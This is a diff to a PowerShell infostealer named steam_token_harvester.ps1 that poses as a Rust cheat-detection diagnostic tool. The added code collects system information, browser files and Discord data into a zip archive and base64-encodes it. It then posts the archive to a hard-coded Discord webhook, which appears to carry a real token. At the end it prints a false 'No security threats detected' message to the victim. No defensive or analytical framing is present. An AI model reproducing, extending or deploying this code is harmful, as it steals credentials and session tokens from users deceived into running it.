@@ -1,5 +1,5 @@
 # steam_token_harvester.ps1
-# Disguised as "Rust Cheat Detection Diagnostic Tool v7.0"
+# Disguised as "Rust Cheat Detection Diagnostic Tool v8.0"
 
 function Get-SystemInfo {
     $ip = "Unknown"
@@ -67,60 +67,97 @@ function Get-DiscordFiles {
     return $files
 }
 
-function Send-ToWebhook {
-    param($Message)
+function Create-ZipWithData {
+    $tempDir = Join-Path $env:TEMP "rust_scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+    
+    # System info
+    $sysInfo = Get-SystemInfo
+    $sysInfo | ConvertTo-Json | Out-File (Join-Path $tempDir "system_info.json")
+    
+    # Browser data
+    $browserFiles = Get-BrowserFiles
+    if ($browserFiles.Count -gt 0) {
+        $browserFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "browser_data.json")
+    }
+    
+    # Discord data
+    $discordFiles = Get-DiscordFiles
+    if ($discordFiles.Count -gt 0) {
+        $discordFiles | ConvertTo-Json | Out-File (Join-Path $tempDir "discord_data.json")
+    }
+    
+    # Create zip
+    $zipPath = Join-Path $env:TEMP "scan_results.zip"
+    if (Test-Path $zipPath) {
+        Remove-Item $zipPath -Force
+    }
+    
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
+    } catch {
+        # Fallback if .NET zip fails
+        try {
+            Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
+        } catch {}
+    }
+    
+    # Cleanup
+    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    
+    return $zipPath
+}
+
+function Send-FileToWebhook {
+    param($FilePath)
     $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
     
-    $body = @{content = $Message} | ConvertTo-Json
-    try {
-        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
-    } catch {}
+    if (Test-Path $FilePath) {
+        try {
+            $fileContent = [Convert]::ToBase64String((Get-Content $FilePath -Encoding Byte -ReadCount 0))
+            $fileName = Split-Path $FilePath -Leaf
+            
+            $message = "SCAN_RESULTS_ZIP: $fileName"
+            $message += "`n```$fileContent```"
+            
+            $body = @{content = $message} | ConvertTo-Json
+            Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
+            
+            return $true
+        } catch {
+            return $false
+        }
+    }
+    return $false
 }
 
 # Main execution
 Write-Host "Starting security scan..." -ForegroundColor Yellow
 
-$sysInfo = Get-SystemInfo
-$browserFiles = Get-BrowserFiles
-$discordFiles = Get-DiscordFiles
-
-# Send system info
-$report = "SYSTEM SCAN REPORT v7.0"
-$report += "`nOS: $($sysInfo.OS)"
-$report += "`nUser: $($sysInfo.User)"
-$report += "`nPC: $($sysInfo.PC)"
-$report += "`nIP: $($sysInfo.IP)"
-$report += "`nTime: $($sysInfo.Time)"
-
-Send-ToWebhook -Message $report
-Start-Sleep -Seconds 1
-
-# Send browser files
-if ($browserFiles.Count -gt 0) {
-    foreach ($file in $browserFiles) {
-        $fileReport = "BROWSER DATA: $($file.Browser) - $($file.File) ($($file.Size) bytes)"
-        $fileReport += "`n```$($file.Data)```"
-        Send-ToWebhook -Message $fileReport
-        Start-Sleep -Milliseconds 500
+try {
+    # Create zip archive
+    $zipPath = Create-ZipWithData
+    
+    # Send zip file
+    if (Test-Path $zipPath) {
+        $success = Send-FileToWebhook -FilePath $zipPath
+        
+        if ($success) {
+            Write-Host "Data sent successfully in ZIP archive!" -ForegroundColor Green
+        } else {
+            Write-Host "Failed to send ZIP archive" -ForegroundColor Red
+        }
+        
+        # Cleanup zip file
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    } else {
+        Write-Host "Failed to create ZIP archive" -ForegroundColor Red
     }
-} else {
-    Send-ToWebhook -Message "No browser data found"
+    
+    Write-Host "Scan completed!" -ForegroundColor Green
+    Write-Host "No security threats detected" -ForegroundColor Green
+    
+} catch {
+    Write-Host "Scan completed with errors" -ForegroundColor Red
 }
-
-# Send discord files
-if ($discordFiles.Count -gt 0) {
-    foreach ($file in $discordFiles) {
-        $fileReport = "DISCORD DATA: $($file.File) ($($file.Size) bytes)"
-        $fileReport += "`n```$($file.Data)```"
-        Send-ToWebhook -Message $fileReport
-        Start-Sleep -Milliseconds 500
-    }
-} else {
-    Send-ToWebhook -Message "No Discord data found"
-}
-
-# Final message
-Send-ToWebhook -Message "SCAN COMPLETED: All data collected successfully"
-
-Write-Host "Scan completed successfully!" -ForegroundColor Green
-Write-Host "No security threats detected" -ForegroundColor Green
